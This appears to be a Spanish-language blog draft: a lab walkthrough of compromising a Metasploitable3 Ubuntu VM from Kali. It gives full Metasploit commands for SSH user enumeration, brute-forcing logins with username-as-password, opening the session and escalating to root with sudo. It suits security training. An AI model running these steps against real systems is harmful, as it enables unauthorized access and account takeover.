+++ 
draft = true
date = 2021-10-11T19:32:07+02:00
title = ""
description = "Tomar el control de Metasploitable3"
slug = "Tomar el control de Metasploitable3"
authors = ["Daniel Parrales"]
tags = []
categories = []
externalLink = ""
series = []
+++

# Tomar el control de la máquina Ubuntu de Metasploitable3 a través de un ataque de fuerza bruta por SSH

En esta parte vamos a utilizar una máquina con sistema operativo Kali Linux para tomar el control de una máquina Ubuntu creada a través de “Metasploitable3”, por lo que ha sido creada con multitud de vulnerabilidades que podremos aprovechar. En este caso en concreto, he optado por usar un ataque de fuerza bruta para conectarme por ssh a la máquina y una vez dentro escalar privilegios para convertirme en root, obteniendo así el control total de la máquina.

Para ello, lo primero es averiguar si la máquina objetivo tiene el puerto 22 abierto. Lo  comprobamos usando el siguiente comando:

`
nmap -p 22 192.168.122.254
`

Obtenemos la siguiente información:

![nmap_meta.png](/images/metasploitable3/nmap_meta.png)

Como podemos ver, el puerto está abierto. Ahora usaremos un módulo auxiliar que está instalado en Kali Linux para conseguir toda la lista de usuarios que hay creados en la máquina objetivo. Seguimos los siguientes pasos:

```
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.122.254
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

Con esto, tras acabar el módulo, obtenemos la siguiente lista de usuarios:

```
[*] 192.168.122.254:22 - SSH - Using malformed packet technique
[*] 192.168.122.254:22 - SSH - Starting scan
[+] 192.168.122.254:22 - SSH - User '4Dgifts' found
[+] 192.168.122.254:22 - SSH - User 'abrt' found
[+] 192.168.122.254:22 - SSH - User 'adm' found
[+] 192.168.122.254:22 - SSH - User 'admin' found
[+] 192.168.122.254:22 - SSH - User 'administrator' found
[+] 192.168.122.254:22 - SSH - User 'anon' found
[+] 192.168.122.254:22 - SSH - User '_apt' found
[+] 192.168.122.254:22 - SSH - User 'arpwatch' found
[+] 192.168.122.254:22 - SSH - User 'auditor' found
[+] 192.168.122.254:22 - SSH - User 'avahi' found
[+] 192.168.122.254:22 - SSH - User 'avahi-autoipd' found
[+] 192.168.122.254:22 - SSH - User 'backup' found
[+] 192.168.122.254:22 - SSH - User 'bbs' found
[+] 192.168.122.254:22 - SSH - User 'beef-xss' found
[+] 192.168.122.254:22 - SSH - User 'bin' found
[+] 192.168.122.254:22 - SSH - User 'bitnami' found
[+] 192.168.122.254:22 - SSH - User 'checkfs' found
[+] 192.168.122.254:22 - SSH - User 'checkfsys' found
[+] 192.168.122.254:22 - SSH - User 'checksys' found
[+] 192.168.122.254:22 - SSH - User 'chronos' found
[+] 192.168.122.254:22 - SSH - User 'chrony' found
[+] 192.168.122.254:22 - SSH - User 'cmwlogin' found
[+] 192.168.122.254:22 - SSH - User 'cockpit-ws' found
[+] 192.168.122.254:22 - SSH - User 'colord' found
[+] 192.168.122.254:22 - SSH - User 'couchdb' found
[+] 192.168.122.254:22 - SSH - User 'cups-pk-helper' found
[+] 192.168.122.254:22 - SSH - User 'daemon' found
[+] 192.168.122.254:22 - SSH - User 'dbadmin' found
[+] 192.168.122.254:22 - SSH - User 'dbus' found
[+] 192.168.122.254:22 - SSH - User 'Debian-exim' found
[+] 192.168.122.254:22 - SSH - User 'Debian-snmp' found
[+] 192.168.122.254:22 - SSH - User 'demo' found
[+] 192.168.122.254:22 - SSH - User 'demos' found
[+] 192.168.122.254:22 - SSH - User 'diag' found
[+] 192.168.122.254:22 - SSH - User 'distccd' found
[+] 192.168.122.254:22 - SSH - User 'dni' found
[+] 192.168.122.254:22 - SSH - User 'dnsmasq' found
[+] 192.168.122.254:22 - SSH - User 'dradis' found
[+] 192.168.122.254:22 - SSH - User 'EZsetup' found
[+] 192.168.122.254:22 - SSH - User 'fal' found
[+] 192.168.122.254:22 - SSH - User 'fax' found
[+] 192.168.122.254:22 - SSH - User 'ftp' found
[+] 192.168.122.254:22 - SSH - User 'games' found
[+] 192.168.122.254:22 - SSH - User 'gdm' found
[+] 192.168.122.254:22 - SSH - User 'geoclue' found
[+] 192.168.122.254:22 - SSH - User 'gnats' found
[+] 192.168.122.254:22 - SSH - User 'gnome-initial-setup' found
[+] 192.168.122.254:22 - SSH - User 'gopher' found
[+] 192.168.122.254:22 - SSH - User 'gropher' found
[+] 192.168.122.254:22 - SSH - User 'guest' found
[+] 192.168.122.254:22 - SSH - User 'haldaemon' found
[+] 192.168.122.254:22 - SSH - User 'halt' found
[+] 192.168.122.254:22 - SSH - User 'hplip' found
[+] 192.168.122.254:22 - SSH - User 'inetsim' found
[+] 192.168.122.254:22 - SSH - User 'informix' found
[+] 192.168.122.254:22 - SSH - User 'install' found
[+] 192.168.122.254:22 - SSH - User 'iodine' found
[+] 192.168.122.254:22 - SSH - User 'irc' found
[+] 192.168.122.254:22 - SSH - User 'jet' found
[+] 192.168.122.254:22 - SSH - User 'karaf' found
[+] 192.168.122.254:22 - SSH - User 'kernoops' found
[+] 192.168.122.254:22 - SSH - User 'king-phisher' found
[+] 192.168.122.254:22 - SSH - User 'landscape' found
[+] 192.168.122.254:22 - SSH - User 'libstoragemgmt' found
[+] 192.168.122.254:22 - SSH - User 'libuuid' found
[+] 192.168.122.254:22 - SSH - User 'lightdm' found
[+] 192.168.122.254:22 - SSH - User 'list' found
[+] 192.168.122.254:22 - SSH - User 'listen' found
[+] 192.168.122.254:22 - SSH - User 'lp' found
[+] 192.168.122.254:22 - SSH - User 'lpadm' found
[+] 192.168.122.254:22 - SSH - User 'lpadmin' found
[+] 192.168.122.254:22 - SSH - User 'lxd' found
[+] 192.168.122.254:22 - SSH - User 'lynx' found
[+] 192.168.122.254:22 - SSH - User 'mail' found
[+] 192.168.122.254:22 - SSH - User 'man' found
[+] 192.168.122.254:22 - SSH - User 'me' found
[+] 192.168.122.254:22 - SSH - User 'messagebus' found
[+] 192.168.122.254:22 - SSH - User 'miredo' found
[+] 192.168.122.254:22 - SSH - User 'mountfs' found
[+] 192.168.122.254:22 - SSH - User 'mountfsys' found
[+] 192.168.122.254:22 - SSH - User 'mountsys' found
[+] 192.168.122.254:22 - SSH - User 'mysql' found
[+] 192.168.122.254:22 - SSH - User 'news' found
[+] 192.168.122.254:22 - SSH - User 'noaccess' found
[+] 192.168.122.254:22 - SSH - User 'nobody' found
[+] 192.168.122.254:22 - SSH - User 'nobody4' found
[+] 192.168.122.254:22 - SSH - User 'ntp' found
[+] 192.168.122.254:22 - SSH - User 'nuucp' found
[+] 192.168.122.254:22 - SSH - User 'nxautomation' found
[+] 192.168.122.254:22 - SSH - User 'nxpgsql' found
[+] 192.168.122.254:22 - SSH - User 'omi' found
[+] 192.168.122.254:22 - SSH - User 'omsagent' found
[+] 192.168.122.254:22 - SSH - User 'operator' found
[+] 192.168.122.254:22 - SSH - User 'oracle' found
[+] 192.168.122.254:22 - SSH - User 'OutOfBox' found
[+] 192.168.122.254:22 - SSH - User 'pi' found
[+] 192.168.122.254:22 - SSH - User 'polkitd' found
[+] 192.168.122.254:22 - SSH - User 'pollinate' found
[+] 192.168.122.254:22 - SSH - User 'popr' found
[+] 192.168.122.254:22 - SSH - User 'postfix' found
[+] 192.168.122.254:22 - SSH - User 'postgres' found
[+] 192.168.122.254:22 - SSH - User 'postmaster' found
[+] 192.168.122.254:22 - SSH - User 'printer' found
[+] 192.168.122.254:22 - SSH - User 'proxy' found
[+] 192.168.122.254:22 - SSH - User 'pulse' found
[+] 192.168.122.254:22 - SSH - User 'redsocks' found
[+] 192.168.122.254:22 - SSH - User 'rfindd' found
[+] 192.168.122.254:22 - SSH - User 'rje' found
[+] 192.168.122.254:22 - SSH - User 'root' found
[+] 192.168.122.254:22 - SSH - User 'ROOT' found
[+] 192.168.122.254:22 - SSH - User 'rooty' found
[+] 192.168.122.254:22 - SSH - User 'rpc' found
[+] 192.168.122.254:22 - SSH - User 'rpcuser' found
[+] 192.168.122.254:22 - SSH - User 'rtkit' found
[+] 192.168.122.254:22 - SSH - User 'rwhod' found
[+] 192.168.122.254:22 - SSH - User 'saned' found
[+] 192.168.122.254:22 - SSH - User 'service' found
[+] 192.168.122.254:22 - SSH - User 'setroubleshoot' found
[+] 192.168.122.254:22 - SSH - User 'setup' found
[+] 192.168.122.254:22 - SSH - User 'sgiweb' found
[+] 192.168.122.254:22 - SSH - User 'shutdown' found
[+] 192.168.122.254:22 - SSH - User 'sigver' found
[+] 192.168.122.254:22 - SSH - User 'speech-dispatcher' found
[+] 192.168.122.254:22 - SSH - User 'sshd' found
[+] 192.168.122.254:22 - SSH - User 'sslh' found
[+] 192.168.122.254:22 - SSH - User 'sssd' found
[+] 192.168.122.254:22 - SSH - User 'stunnel4' found
[+] 192.168.122.254:22 - SSH - User 'sym' found
[+] 192.168.122.254:22 - SSH - User 'symop' found
[+] 192.168.122.254:22 - SSH - User 'sync' found
[+] 192.168.122.254:22 - SSH - User 'sys' found
[+] 192.168.122.254:22 - SSH - User 'sysadm' found
[+] 192.168.122.254:22 - SSH - User 'sysadmin' found
[+] 192.168.122.254:22 - SSH - User 'sysbin' found
[+] 192.168.122.254:22 - SSH - User 'syslog' found
[+] 192.168.122.254:22 - SSH - User 'system_admin' found
[+] 192.168.122.254:22 - SSH - User 'systemd-bus-proxy' found
[+] 192.168.122.254:22 - SSH - User 'systemd-coredump' found
[+] 192.168.122.254:22 - SSH - User 'systemd-network' found
[+] 192.168.122.254:22 - SSH - User 'systemd-resolve' found
[+] 192.168.122.254:22 - SSH - User 'systemd-timesync' found
[+] 192.168.122.254:22 - SSH - User 'tcpdump' found
[+] 192.168.122.254:22 - SSH - User 'trouble' found
[+] 192.168.122.254:22 - SSH - User 'tss' found
[+] 192.168.122.254:22 - SSH - User 'udadmin' found
[+] 192.168.122.254:22 - SSH - User 'ultra' found
[+] 192.168.122.254:22 - SSH - User 'umountfs' found
[+] 192.168.122.254:22 - SSH - User 'umountfsys' found
[+] 192.168.122.254:22 - SSH - User 'umountsys' found
[+] 192.168.122.254:22 - SSH - User 'unix' found
[+] 192.168.122.254:22 - SSH - User 'unscd' found
[+] 192.168.122.254:22 - SSH - User 'us_admin' found
[+] 192.168.122.254:22 - SSH - User 'usbmux' found
[+] 192.168.122.254:22 - SSH - User 'user' found
[+] 192.168.122.254:22 - SSH - User 'uucp' found
[+] 192.168.122.254:22 - SSH - User 'uucpadm' found
[+] 192.168.122.254:22 - SSH - User 'uuidd' found
[+] 192.168.122.254:22 - SSH - User 'vagrant' found
[+] 192.168.122.254:22 - SSH - User 'varnish' found
[+] 192.168.122.254:22 - SSH - User 'web' found
[+] 192.168.122.254:22 - SSH - User 'webmaster' found
[+] 192.168.122.254:22 - SSH - User 'whoopsie' found
[+] 192.168.122.254:22 - SSH - User 'www' found
[+] 192.168.122.254:22 - SSH - User 'www-data' found
[+] 192.168.122.254:22 - SSH - User 'xpdb' found
[+] 192.168.122.254:22 - SSH - User 'xpopr' found
[+] 192.168.122.254:22 - SSH - User 'zabbix' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Como podemos ver, hay una gran cantidad de usuarios creados en el sistema. El siguiente paso es añadir el nombre de los usuarios en un solo fichero, que será el que usemos para ejecutar el ataque de fuerza bruta. Para ello usamos:

`
cat listausr.txt | awk '{print $7}' > listafinal.txt
`

Este comando hará que la lista anterior (que hemos añadido al fichero *listausr.txt*), se traspase a otro fichero dejando únicamente los usuarios (es posible que haya que eliminar las comillas que queden).

Obtenido el fichero *listafinal.txt*, haremos uso de otro módulo de Kali Linux que nos permitirá realizar el ataque de fuerza bruta a través de ssh. Para la ejecución del ataque seguiremos los siguientes pasos:

```
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.122.254
set USER_AS_PASS true
set USER_FILE /home/kali/listafinal.txt
run
```

Tras un tiempo (dependerá de los recursos de nuestra máquina), obtendremos lo siguiente, ya que metasploitable ha creado un usuario  vagrant con la contraseña vagrant:

![contra_meta.png](/images/metasploitable3/contra_meta.png)

Como podemos ver, nos ha indicado que el usuario vagrant tiene la contraseña vagrant. A partir de aquí tenemos dos opciones para conectarnos a la máquina objetivo. La primera es una conexión ssh normal, ya que sabemos el nombre de usuario y la contraseña. La segunda es hacer uso de una sesión que nos ha creado Kali Linux automáticamente al encontrar la contraseña. Yo he optado por la segunda.
Así pues ejecutamos:

`
sessions -i 1
`

![sesion1.png](/images/metasploitable3/sesion1.png)

Una vez hemos accedido a la máquina, podemos ejecutar comandos como lo haríamos en nuestra máquina. Yo he ejecutado el comando *“id”*, para comprobar que he entrado como *“vagrant”*. Además con este comando podemos comprobar que el usuario *"vagrant"* está dentro del grupo de *“sudoers”*, lo que nos da la posibilidad de ejecutar comandos como si fuéramos *"root"*. Una vez llegados hasta este punto, ya tendríamos el control de la máquina, pero podemos asegurarnos de ello si intentamos ponernos como root usando un *“sudo su”*.

![root_meta.png](/images/metasploitable3/root_meta.png)

Al ejecutar ese comando, nos hemos convertido en el usuario root de la máquina, por lo que ahora sí, ya podemos ejecutar cualquier comando en la máquina, cambiar las contraseñas o cambiar lo que queramos dentro de la misma. Ahora ya podemos decir que tenemos el control total de la máquina.